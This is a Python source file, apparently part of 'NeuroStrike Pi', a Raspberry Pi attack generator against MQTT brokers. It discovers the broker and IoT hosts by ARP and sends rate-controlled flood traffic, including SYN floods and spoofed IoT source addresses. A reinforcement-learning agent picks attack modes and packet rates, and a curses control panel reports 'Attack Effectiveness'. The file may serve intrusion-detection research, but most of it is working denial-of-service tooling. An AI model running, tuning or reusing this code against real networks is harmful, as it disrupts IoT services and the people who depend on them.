        self.q  = QNet(STATE_DIM, HIDDEN, N_ACTIONS)
        self.qt = QNet(STATE_DIM, HIDDEN, N_ACTIONS)
        self.qt.fr_d(self.q.to_d())
        self.eps        = EPS_START
        self.step       = 0
        self.sync_every = 100
        self.replay     = collections.deque(maxlen=REPLAY_CAP)
        self._ls        = None
        self._la        = None
        self.rew_hist   = collections.deque(maxlen=200)
        self.loss_hist  = collections.deque(maxlen=200)
        self.mode_rew   = {i: collections.deque(maxlen=50) for i in range(N_MODES)}
        self._stuck_steps   = 0
        self._stuck_mode    = None
        self._forced_switch = False

    def encode(self, mode_idx, pps, fb, cf, tim, broker_up, throughput_ratio):
        oh = np.zeros(N_MODES, dtype=np.float32)
        oh[mode_idx] = 1.0
        win  = max(fb.get("window", FEEDBACK_WINDOW), 1e-6)
        acks = fb.get("acks", 0); rsts = fb.get("rsts", 0); icmps = fb.get("icmps", 0)
        tot  = max(acks + rsts + icmps, 1)
        probe_rate = float(fb.get("success_rate", acks / tot))
        num = np.array([
            pps / MAX_PPS,
            probe_rate,
            rsts / tot,
            max(0., 1. - tot / max(pps * win, 1)),
            min(fb.get("avg_rtt", 0.05), 1.0),
            min(cf / 30., 1.0),
            min(tim / 120., 1.0),
            1.0 if broker_up else 0.0,
            float(np.clip(throughput_ratio, 0.0, 1.5)),
        ], dtype=np.float32)
        return np.concatenate([oh, num])

    def reward(self, fb, cf, broker_up, throughput_ratio=1.0):
        if not broker_up:
            return R_NO_BROKER

        acks = fb.get("acks", 0)
        rsts = fb.get("rsts", 0)
        icmps = fb.get("icmps", 0)
        ar = acks / max(acks + rsts + icmps, 1)

        r = acks * R_ACK + rsts * R_RST + icmps * R_ICMP

        if acks == 0 and rsts == 0:
            r += R_TIMEOUT * (fb.get("window", FEEDBACK_WINDOW) / FEEDBACK_WINDOW)

        if ar > 0.4:
            r += R_ACK_BON

        # Penalize target rates that the sender cannot actually sustain.
        if throughput_ratio < 0.85:
            r -= (0.85 - throughput_ratio) * 12.0

        if cf > 15:
            r += R_STUCK

        return float(np.clip(r, -50., 50.))

    def act(self, s):
        if random.random() < self.eps:
            return random.randint(0, N_ACTIONS - 1)
        return int(np.argmax(self.q.fwd(s)))

    def decode(self, a): return a // N_PPS_ACT, (a % N_PPS_ACT) - 1

    def _check_stuck(self, mode_idx):
        if self._stuck_mode != mode_idx:
            self._stuck_mode = mode_idx; self._stuck_steps = 1; return False
        self._stuck_steps += 1
        if self._stuck_steps < STUCK_STEPS: return False
        recent = list(self.mode_rew.get(mode_idx, []))
        if len(recent) < 5: return False
        avg_rew = float(np.mean(recent[-STUCK_STEPS:]))
        if avg_rew < STUCK_REW_THRESH:
            self._stuck_steps = 0; return True
        return False

    def update(self, s, rew, mode_idx):
        self.mode_rew[mode_idx].append(rew)
        if self._ls is None:
            self._ls = s.copy(); self._la = self.act(s); return self._la
        self.replay.append((self._ls.copy(), self._la, rew, s.copy()))
        if len(self.replay) >= BATCH_RL: self._train()
        self.eps  = max(EPS_END, self.eps * EPS_DECAY)
        self.step += 1
        if self.step % self.sync_every == 0: self.qt.fr_d(self.q.to_d())
        forced = self._check_stuck(mode_idx)
        if forced:
            new_mode  = random.choice([i for i in range(N_MODES) if i != mode_idx])
            na        = new_mode * N_PPS_ACT + random.randint(0, N_PPS_ACT - 1)
            self._forced_switch = True
        else:
            na = self.act(s); self._forced_switch = False
        self._ls = s.copy(); self._la = na; self.rew_hist.append(rew)
        return na

    def _train(self):
        batch = random.sample(list(self.replay), BATCH_RL)
        total_loss = 0.0
        for s, a, r, sn in batch:
            q_vals = self.q.fwd(s); next_q = self.qt.fwd(sn)
            target = r + GAMMA * float(np.max(next_q))
            err    = target - q_vals[a]; total_loss += err ** 2
            h2 = np.maximum(0,
                 np.maximum(0, s @ self.q.W1 + self.q.b1) @ self.q.W2 + self.q.b2)
            dout = np.zeros(N_ACTIONS, dtype=np.float32); dout[a] = -2.0 * err
            self.q.W3 -= LR * np.outer(h2, dout); self.q.b3 -= LR * dout
        self.loss_hist.append(total_loss / BATCH_RL)

    def best_modes(self, top_n=3):
        avgs = [(i, float(np.mean(v))) for i, v in self.mode_rew.items() if v]
        avgs.sort(key=lambda x: -x[1]); return avgs[:top_n]

    def save(self, path):
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "wb") as f:
            pickle.dump({"q": self.q.to_d(), "qt": self.qt.to_d(),
                         "eps": self.eps, "step": self.step}, f)

    def load(self, path):
        if not os.path.exists(path): return False
        try:
            with open(path, "rb") as f: d = pickle.load(f)
            self.q.fr_d(d["q"]); self.qt.fr_d(d["qt"])
            self.eps  = d.get("eps",  EPS_START)
            self.step = d.get("step", 0); return True
        except: return False

    def avg_r(self): return float(np.mean(self.rew_hist)) if self.rew_hist else 0.
    def avg_l(self): return float(np.mean(self.loss_hist)) if self.loss_hist else 0.

# ============================================================================
# SHARED STATE
# ============================================================================

class State:
    def __init__(self):
        self.lock             = threading.Lock()
        self.on               = False; self.rl_on = True
        self.mode_idx         = 0; self.tgt_pps = 250
        self.sent             = 0; self.errs = 0; self.hs_ok = 0; self.hs_fail = 0
        self.syn_ok           = 0
        self._wt              = collections.deque()
        self._wb              = collections.deque()
        self.pps              = 0.; self.bps = 0.; self.t_start = None
        self._tput_times      = collections.deque()
        self.sent_frames      = 0
        self.throughput_ratio = 1.0
        self.broker_up        = True
        self.broker_rtt       = 0.
        self.probe_ok_rate    = 1.0
        self.probe_ms         = 0.0
        self.rl_rew           = 0.; self.rl_eps = EPS_START; self.rl_step = 0
        self.rl_act           = "â€”"; self.rl_rsn = "Init"
        self.rl_acks          = 0; self.rl_rsts = 0; self.rl_loss = 0.
        self.rl_forced        = False
        self.cf               = 0; self._mode_t = time.time()
        self.top_modes        = []

    def record(self, nb, is_hs, frame_count=1):
        now = time.time()
        frame_count = max(int(frame_count), 1)
        with self.lock:
            if nb > 0:
                self.sent += 1
                self.sent_frames += frame_count
                for _ in range(frame_count):
                    self._wt.append(now)
                    self._tput_times.append(now)
                self._wb.append(nb)
                if is_hs:
                    self.hs_ok += 1
                else:
                    self.syn_ok += 1   # SYN flood packets counted separately
            else:
                self.errs += 1
                if is_hs:
                    self.hs_fail += 1

            c = now - 2.0
            while self._wt and self._wt[0] < c:
                self._wt.popleft()
            while self._wb and len(self._wb) > len(self._wt):
                self._wb.popleft()

            while len(self._wt) > 10000:
                self._wt.popleft()
            while len(self._wb) > 5000:
                self._wb.popleft()

            n = len(self._wt)
            if n >= 2:
                sp = self._wt[-1] - self._wt[0]
                if sp > 0:
                    self.pps = n / sp
                    self.bps = sum(self._wb) / sp

            tc = now - THROUGHPUT_WINDOW
            while self._tput_times and self._tput_times[0] < tc:
                self._tput_times.popleft()
            actual_pps = len(self._tput_times) / THROUGHPUT_WINDOW
            self.throughput_ratio = actual_pps / self.tgt_pps if self.tgt_pps > 0 else 1.0

# ============================================================================
# THREADS
# ============================================================================

def sender_t(st: State, mc: ModelCache, sb: SampleBuffer, probe: BrokerProbe):
    """
    Hybrid sender with micro-batching for higher real throughput.

    At lower rates it sends one logical attack per loop for smoother timing.
    At higher rates it sends small back-to-back batches to reduce Python loop,
    lock, and timer overhead while still roughly respecting the target rate.
    Probe status is refreshed every 100 logical sends.
    """
    probe_update_counter = 0

    while True:
        with st.lock:
            on = st.on
            mi = st.mode_idx
            tgt = st.tgt_pps
        if not on:
            time.sleep(0.05)
            continue

        iface = disc.iface or "wlan0"

        probe_update_counter += 1
        if probe_update_counter >= 100:
            probe_update_counter = 0
            pstat = probe.full_status()
            with st.lock:
                st.broker_up     = pstat["ok"]
                st.broker_rtt    = pstat["ms"]
                st.probe_ok_rate = pstat["success_rate"]
                st.probe_ms      = pstat["ms"]

        mode = ALL_MODES[mi]

        if tgt >= 300:
            batch_size = min(16, max(2, tgt // 250))
        else:
            batch_size = 1

        inter_packet = 1.0 / max(tgt, 1)
        batch_start = time.perf_counter()

        for _ in range(batch_size):
            row, src = _get_row(mode, mc, sb)
            is_mqtt = BASE_PROFILES[src]["send_handshake"]
            nb, frame_count = send_packet(row, src, iface)
            st.record(nb, is_mqtt, frame_count=frame_count)

        elapsed = time.perf_counter() - batch_start
        remaining = inter_packet * batch_size - elapsed
        if remaining > 0.002:
            time.sleep(remaining - 0.001)

        deadline = batch_start + inter_packet * batch_size
        while time.perf_counter() < deadline:
            pass


def _mac_refresh_t(interval: float = 30.0):
    """
    Refreshes the broker MAC address every `interval` seconds via a single
    targeted ARP request (not a full subnet scan). This corrects stale MACs
    that can occur when the broker resets its ARP table under heavy load,
    without disrupting active connections the way a full srp() scan does.
    """
    global _broker_mac
    while True:
        time.sleep(interval)
        broker = disc.broker_ip
        iface = disc.iface or "wlan0"
        if broker and _pi_mac:
            new_mac = _arp_mac(broker, iface, _pi_mac)
            if new_mac and new_mac != b'\xff\xff\xff\xff\xff\xff':
                _broker_mac = new_mac

def rl_t(st: State, agent: RLAgent, fb: ProbeBasedFeedback, probe: BrokerProbe):
    last_save = time.time()
    rl_log_path = "/home/pi/neurostrike_2/rl_log.jsonl"
    os.makedirs("/home/pi/neurostrike_2", exist_ok=True)

    while True:
        time.sleep(FEEDBACK_WINDOW)

        with st.lock:
            on = st.on
            rl = st.rl_on
            mi = st.mode_idx
            pps = st.tgt_pps
            cf = st.cf
            tim = time.time() - st._mode_t
            tput = st.throughput_ratio

        if not on:
            continue

        snap = fb.snap()
        current_broker_up = snap["acks"] > 0

        if not current_broker_up:
            with st.lock:
                st.cf += 1
                cf = st.cf
        else:
            with st.lock:
                st.cf = 0
                cf = 0

        rew = agent.reward(snap, cf, current_broker_up, tput)
        s = agent.encode(mi, pps, snap, cf, tim, current_broker_up, tput)
        act = agent.update(s, rew, mi)

        new_mi, pps_d = agent.decode(act)
        new_pps = int(np.clip(pps + pps_d * PPS_STEP, MIN_PPS, MAX_PPS))
        top = agent.best_modes(3)

        try:
            with open(rl_log_path, "a") as f:
                f.write(json.dumps({
                    "ts": time.time(),
                    "prev_mode": mi,
                    "new_mode": new_mi,
                    "prev_pps": pps,
                    "new_pps": new_pps,
                    "pps_delta": pps_d,
                    "reward": rew,
                    "probe_success_rate": snap.get("success_rate", 0.0),
                    "probe_ms": snap.get("connect_ms", 0.0),
                    "throughput_ratio": tput,
                    "broker_up": current_broker_up,
                    "forced": agent._forced_switch,
                }) + "\n")
        except Exception:
            pass

        if rl:
            nm = ALL_MODES[new_mi]
            rsn = []

            if new_mi != mi:
                src_str = "FORCED" if agent._forced_switch else (
                    "Pure" if nm["type"] == "pure" else "Blend"
                )
                rsn.append(f"{src_str} â†’ {nm['label'][:28]}")

            if pps_d != 0:
                rsn.append(f"PPS {'â†‘' if pps_d > 0 else 'â†“'}{new_pps}")

            if not current_broker_up:
                rsn.append("BROKER DOWN")

            if tput < 0.6:
                rsn.append(f"SUPPRESSED tput={tput:.2f}")

            probe_rate = snap.get("success_rate", 1.0)
            if probe_rate < 0.5 and current_broker_up:
                rsn.append(f"PROBE {probe_rate*100:.0f}% ok")

            if not rsn:
                rsn.append("Hold")

            with st.lock:
                if new_mi != mi:
                    st._mode_t = time.time()

                st.mode_idx = new_mi
                st.tgt_pps = new_pps
                st.broker_up = current_broker_up
                st.probe_ms = snap.get("connect_ms", 0.0)
                st.probe_ok_rate = snap.get("success_rate", 0.0)

                st.rl_rew = rew
                st.rl_eps = agent.eps
                st.rl_step = agent.step
                st.rl_act = f"M{new_mi} P{'+' if pps_d > 0 else ''}{pps_d}"
                st.rl_rsn = " | ".join(rsn)
                st.rl_acks = snap["acks"]
                st.rl_rsts = snap["rsts"]
                st.rl_loss = agent.avg_l()
                st.rl_forced = agent._forced_switch
                st.top_modes = top

        now = time.time()
        if now - last_save > SAVE_INTERVAL:
            agent.save(RL_PATH)
            last_save = now

# ============================================================================
# DASHBOARD
# ============================================================================

def _bar(v, w=22):
    f = int(min(max(v, 0), 1) * w)
    return "â–ˆ" * f + "â–‘" * (w - f)

def dashboard(scr, st: State, agent: RLAgent, mc: ModelCache, rto: RTOTracker):
    curses.curs_set(0); scr.nodelay(True); curses.start_color()
    curses.use_default_colors()
    for i, c in enumerate([(curses.COLOR_GREEN, -1), (curses.COLOR_RED, -1),
                            (curses.COLOR_YELLOW, -1), (curses.COLOR_CYAN, -1),
                            (curses.COLOR_WHITE, -1), (curses.COLOR_MAGENTA, -1)], 1):
        curses.init_pair(i, *c)
    G = curses.color_pair(1) | curses.A_BOLD
    R = curses.color_pair(2) | curses.A_BOLD
    Y = curses.color_pair(3) | curses.A_BOLD
    C = curses.color_pair(4) | curses.A_BOLD
    W = curses.color_pair(5)
    M = curses.color_pair(6) | curses.A_BOLD

    page = 0; lk = 0; MPP = 8; NP = math.ceil(N_MODES / MPP)

    while True:
        k = scr.getch(); now = time.time()
        if   k == ord(' ') and now - lk > 0.2:
            with st.lock:
                st.on = not st.on
                if st.on and st.t_start is None: st.t_start = now
                elif not st.on: st.t_start = None
            lk = now
        elif k == ord('r') and now - lk > 0.2:
            with st.lock: st.rl_on = not st.rl_on; lk = now
        elif k == ord('q'):
            with st.lock: st.on = False; break
        elif k == curses.KEY_DOWN and now - lk > 0.15:
            with st.lock: st.mode_idx = (st.mode_idx + 1) % N_MODES
            page = st.mode_idx // MPP; lk = now
        elif k == curses.KEY_UP and now - lk > 0.15:
            with st.lock: st.mode_idx = (st.mode_idx - 1) % N_MODES
            page = st.mode_idx // MPP; lk = now
        elif k == ord('d') and now - lk > 2.0:
            # Manual network rescan â€” only trigger when attack is OFF
            # to avoid disrupting active connections
            with st.lock: is_on = st.on
            if not is_on:
                threading.Thread(target=disc._scan, daemon=True).start()
            lk = now
        elif k == ord('p') and now - lk > 0.2: page = (page - 1) % NP; lk = now
        elif k == ord('+') and now - lk > 0.1:
            with st.lock: st.tgt_pps = min(st.tgt_pps + PPS_STEP, MAX_PPS); lk = now
        elif k == ord('-') and now - lk > 0.1:
            with st.lock: st.tgt_pps = max(st.tgt_pps - PPS_STEP, MIN_PPS); lk = now

        scr.clear(); H, W_ = scr.getmaxyx(); W2 = min(W_ - 1, 80)
        def s(y, x, t, a=W):
            try:
                if y < H - 1 and x < W_ - 1: scr.addstr(y, x, t[:W_ - x - 1], a)
            except curses.error: pass

        ln = 0; sep = "=" * W2; dsh = "-" * W2
        dstat = disc.status()
        rto_s = rto.current()

        s(ln, 0, sep, C); ln += 1
        tt = "NeuroStrike Pi v2 DYNAMIC â€” Attack Generator + RL"
        s(ln, max(0, (W2 - len(tt)) // 2), tt, C | curses.A_BOLD); ln += 1
        s(ln, 0, sep, C); ln += 2

        with st.lock:
            on  = st.on; mi = st.mode_idx; tgt = st.tgt_pps
            pps = st.pps; bps = st.bps; sent = st.sent; sent_frames = st.sent_frames; errs = st.errs
            ts  = st.t_start; rl_on = st.rl_on
            rl_rew = st.rl_rew; rl_eps = st.rl_eps; rl_step = st.rl_step
            rl_act = st.rl_act; rl_rsn = st.rl_rsn
            rl_acks = st.rl_acks; rl_rsts = st.rl_rsts; rl_loss = st.rl_loss
            rl_forced = st.rl_forced
            b_up = st.broker_up; b_rtt = st.probe_ms; b_rate = st.probe_ok_rate
            hok = st.hs_ok; hfail = st.hs_fail; syn_ok = st.syn_ok
            tput = st.throughput_ratio
            mc_n = mc.loaded(); top = st.top_modes

        mode  = ALL_MODES[mi]; mtype = "PURE" if mode["type"] == "pure" else "BLEND"
        elaps = now - ts if ts else 0

        broker_str = dstat["broker"] or "SCANNING..."
        pi_str     = dstat["pi"]     or "DETECTING..."
        iot_str    = ", ".join(dstat["iot_ips"][:4]) or "NONE FOUND"
        iface_str  = dstat["iface"]  or "?"

        s(ln, 0, f"Interface   : {iface_str}  Pi: {pi_str}", W); ln += 1
        s(ln, 0, f"Broker      : ", W)
        b_str = f"{broker_str}:{BROKER_PORT}  connect={b_rtt:.0f}ms  ok={b_rate*100:.0f}%"
        s(ln, 14, b_str, G if b_up else R); ln += 1
        s(ln, 0, f"Spoof IPs   : {iot_str}  ({len(dstat['iot_ips'])} devices)", W); ln += 1
        s(ln, 0, f"Attack Mode : [{mtype}] ", W); s(ln, 18, mode["label"], Y); ln += 1
        s(ln, 0, f"Models      : {mc_n}/5 CTGAN  |  {N_MODES} modes", W); ln += 2

        # RTO panel
        s(ln, 0, dsh, W); ln += 1
        s(ln, 0, "RTO TRACKER (RFC 6298)", M); ln += 1
        s(ln, 0, f"  SRTT    : {rto_s['srtt_ms']:.2f} ms", W); ln += 1
        s(ln, 0, f"  RTTVAR  : {rto_s['rttvar_ms']:.2f} ms", W); ln += 1
        rto_col = G if rto_s["rto_ms"] < 500 else (Y if rto_s["rto_ms"] < 2000 else R)
        s(ln, 0, f"  RTO     : {rto_s['rto_ms']:.2f} ms", rto_col); ln += 1
        s(ln, 0, f"  Probes  : {rto_s['n_probes']}  (window={RTT_WINDOW_SIZE})", W); ln += 2

        s(ln, 0, dsh, W); ln += 1
        s(ln, 0, "ATTACK CONTROL PANEL", C | curses.A_BOLD); ln += 1
        ss = "[ ON  ]" if on else "[ OFF ]"
        s(ln, 0, "  Status    : ", W); s(ln, 14, ss, G if on else R)
        s(ln, 24, "  [SPACE] toggle", W); ln += 1
        s(ln, 0, f"  Target PPS: {tgt:>5}  [+/-]", W); ln += 1
        rl_s = "[ ENABLED  ]" if rl_on else "[ DISABLED ]"
        s(ln, 0, "  RL Mode   : ", W); s(ln, 14, rl_s, G if rl_on else Y)
        s(ln, 28, "  [R] toggle", W); ln += 2

        s(ln, 0, f"  MODES  Page {page+1}/{NP}  [â†‘â†“] select  [N/P] page", Y); ln += 1
        si = page * MPP; ei = min(si + MPP, N_MODES)
        for i in range(si, ei):
            m  = ALL_MODES[i]; tp = "P" if m["type"] == "pure" else "B"
            ar = float(np.mean(agent.mode_rew[i])) if agent.mode_rew[i] else 0.
            rc = G if ar > 0 else (R if ar < -2 else W)
            s(ln, 0, f"  [{i:02d}]{'â–¶' if i == mi else ' '}[{tp}] {m['label'][:34]}",
              G if i == mi else W)
            s(ln, 52, f"r={ar:+.1f}", rc); ln += 1
        ln += 1

        s(ln, 0, dsh, W); ln += 1
        s(ln, 0, "Traffic:", W); ln += 1
        s(ln, 0, f"  Packets Sent  : {sent:>8,}", W); ln += 1
        s(ln, 0, f"  Packets/sec   : {pps:>8.1f}", W); ln += 1
        s(ln, 0, f"  Throughput    : {bps/1024:>8.1f} KB/s", W); ln += 1
        s(ln, 0, f"  Send Errors   : {errs:>8,}", R if errs else W); ln += 1
        if syn_ok > 0:
            s(ln, 0, f"  SYN Sent      : {syn_ok:>8,}", G); ln += 1
        if hok > 0 or hfail > 0:
            s(ln, 0, f"  MQTT Sends    : {hok:>5} ok / {hfail:>5} fail",
              G if hok > 0 else (Y if hfail > 0 else W)); ln += 1
        probe_bar = _bar(b_rate, W2 - 24)
        s(ln, 0, f"  Broker Probe  : [{probe_bar}] {b_rate*100:.0f}% accept",
          G if b_rate > 0.7 else (Y if b_rate > 0.2 else R)); ln += 1
        tput_col = G if tput > 0.8 else (Y if tput > 0.5 else R)
        s(ln, 0, f"  Tput ratio    : {tput:>8.2f}  [{_bar(min(tput,1),14)}]", tput_col)
        if tput < 0.6: s(ln, 40, "â† SUPPRESSED", R)
        ln += 1
        s(ln, 0, f"  Session Time  : {int(elaps):>8}s", W); ln += 2

        s(ln, 0, dsh, W); ln += 1
        s(ln, 0, "RL AGENT", M); ln += 1
        s(ln, 0, f"  Step : {rl_step:>6}  Îµ={rl_eps:.3f}  Loss={rl_loss:.4f}  State={STATE_DIM}d", W); ln += 1
        rc = G if rl_rew > 0 else (R if rl_rew < -5 else Y)
        s(ln, 0, f"  Reward : ", W); s(ln, 11, f"{rl_rew:>+8.2f}", rc)
        s(ln, 23, f"  Probe:{rl_acks}ok  Blk:{rl_rsts}", W); ln += 1
        act_label = rl_act + (" [FORCED]" if rl_forced else "")
        s(ln, 0, f"  Action : {act_label}", Y if not rl_forced else R); ln += 1
        s(ln, 0, f"  Reason : {rl_rsn[:W2-11]}", C); ln += 2

        if top:
            s(ln, 0, "  Top modes by avg reward:", W); ln += 1
            for i2, (mi2, ar) in enumerate(top[:3]):
                nm = ALL_MODES[mi2]["label"][:28]
                s(ln, 0, f"    #{i2+1} [{mi2:02d}] {nm:<28} r={ar:+.2f}",
                  G if ar > 0 else Y); ln += 1
        ln += 1

        eff = min(pps / max(tgt, 1), 1)
        s(ln, 0, "Attack Effectiveness:", W); ln += 1
        s(ln, 0, f"  [{_bar(eff, W2-4)}]", G if eff > 0.7 else Y); ln += 1
        s(ln, 0, f"  {pps:.0f}/{tgt} pps  ({eff*100:.0f}%)", W); ln += 2

        s(ln, 0, dsh, W); ln += 1
        s(ln, 0, "  [SPACE] ON/OFF  [â†‘â†“] Mode  [N/P] Page  [+/-] Rate  [R] RL  [D] Rescan  [Q] Quit", Y)
        try:
            scr.addstr(H-1, 0, sep[:W2], curses.color_pair(4))
        except curses.error:
            pass
        scr.refresh(); scr.erase(); time.sleep(0.1)

# ============================================================================
# MAIN
# ============================================================================

def main():
    print("=" * 70)
    print("NeuroStrike Pi v2 DYNAMIC â€” Attack Generator + RL")
    print("=" * 70)
    print("  Starting network discovery (ARP scan)...")

    disc.start()
    if not disc.wait_ready(timeout=30):
        print("  âš ï¸  Network discovery timed out â€” continuing with no targets")
    else:
        dstat = disc.status()
        print(f"  Pi IP     : {dstat['pi']} ({dstat['iface']})")
        print(f"  Broker    : {dstat['broker'] or 'NOT FOUND'}")
        print(f"  IoT IPs   : {dstat['iot_ips'] or 'NONE'}")
        print(f"  All hosts : {dstat['hosts']}")
        # Pre-resolve MACs so first packets don't stall on ARP
        if dstat["broker"] and dstat["iface"]:
            print("  Resolving MACs...")
            _init_macs(dstat["iface"], dstat["broker"])
            print(f"  Pi  MAC : {':'.join(f'{b:02x}' for b in _pi_mac)}")
            print(f"  Broker MAC : {':'.join(f'{b:02x}' for b in _broker_mac)}")

    if not disc.broker_ip:
        print("\n  âš ï¸  No MQTT broker found on local network.")
        print("     Attack will be suppressed until broker is discovered.")
        print("     Re-scanning every 5 seconds...")

    print(f"\n  Modes     : {N_MODES}  ({len(PURE_NAMES)} pure + {N_MODES - len(PURE_NAMES)} blended)")
    print(f"  Actions   : {N_ACTIONS}  ({N_MODES} modes Ã— {N_PPS_ACT} PPS deltas)")
    print(f"  State dim : {STATE_DIM}")
    print(f"  RTO log   : {RTO_LOG_PATH}")
    print(f"  RTT window: {RTT_WINDOW_PATH}")
    print("=" * 70)

    mc    = ModelCache(MODEL_DIR)
    sb    = SampleBuffer(); sb.start(mc)
    agent = RLAgent()
    if agent.load(RL_PATH):
        print(f"  âœ“ RL weights loaded  step={agent.step}  Îµ={agent.eps:.3f}")
    else:
        print("  â„¹  Fresh RL agent â€” starting from scratch")

    st    = State()
    rto   = RTOTracker(pps_getter=lambda: st.pps)
    probe = BrokerProbe(rto); probe.start()
    fb    = ProbeBasedFeedback(probe); fb.start()

    threading.Thread(target=sender_t,     args=(st, mc, sb, probe), daemon=True).start()
    threading.Thread(target=rl_t,         args=(st, agent, fb, probe), daemon=True).start()
    threading.Thread(target=_mac_refresh_t, args=(30.0,), daemon=True).start()
    
    shutdown_once = threading.Event()
    
    def _cleanup():
        if shutdown_once.is_set():
            return
        shutdown_once.set()
        
        with st.lock: st.on = False
        
        print("\n  Saving RL weights...")
        agent.save(RL_PATH)
        print(f"  âœ“ Saved â†’ {RL_PATH}")
        print(f"  Logical sends: {st.sent:,}  Frames: {st.sent_frames:,}  Errors: {st.errs}")
        print(f"  MQTT sends ok: {st.hs_ok}  fail: {st.hs_fail}")
        print(f"  RL steps: {agent.step}  avg reward: {agent.avg_r():.2f}")
        rto_s = rto.current()
        print(f"  Final RTO: {rto_s['rto_ms']:.2f} ms  "
              f"(SRTT={rto_s['srtt_ms']:.2f}  RTTVAR={rto_s['rttvar_ms']:.2f})")
        print(f"  RTO log: {RTO_LOG_PATH}")
        
    def _bye(sig, frm):
        _cleanup()
        raise SystemExit(0)
        
    signal.signal(signal.SIGINT,  _bye)
    signal.signal(signal.SIGTERM, _bye)

    try:
        curses.wrapper(dashboard, st, agent, mc, rto)
    except SystemExit:
        pass
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"Dashboard error: {e}"); raise
    finally:
        _cleanup()


if __name__ == "__main__":
    main()
